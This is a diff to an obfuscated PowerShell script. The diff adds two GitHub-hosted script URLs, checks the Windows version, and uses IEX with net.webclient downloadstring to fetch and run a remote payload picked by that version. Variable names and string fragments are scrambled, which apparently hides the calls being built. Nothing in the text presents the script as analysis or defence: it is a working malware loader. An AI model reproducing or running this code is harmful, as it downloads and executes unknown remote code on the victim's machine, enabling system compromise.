@@ -1,7 +1,6 @@
 try
 {
 
-
 $uggiukP='Sy'
 $osiqhdcjwoc='.Man'
 $iouhoaiucio='stem'
@@ -35,11 +34,29 @@ $iasovosaivavspajv='tic'
 finally
 {
 
-$kdisxosdjjd='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/Updater.ps1''
+$hdhcisichd='https://raw.githubusercontent.com/GOTREMOVED/main/lib64.ps1'
+
+$skchixhojsx='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib63.ps1''
 
 
+$OSVersion = (Get-WmiObject Win32_OperatingSystem).Caption
 
 
-$rgualnNZnZum = (new-object net.webclient); IeX ($rgualnNZnZum.downloadstring($kdisxosdjjd))
+if ($OSVersion -match "7")
+            {
+                IEX ((new-object net.webclient).downloadstring($hdhcisichd))
+            }
+    
+            if ($OSVersion -match "8")
+            {
+                IEX ((new-object net.webclient).downloadstring($hdhcisichd))
+            }
+        
+            if ($OSVersion -match "10")
+            {
+                $KNoVVlEzEWY = (new-object net.webclient); IeX ($KNoVVlEzEWY.downloadstring($skchixhojsx))
+            }
+
+
 
 }
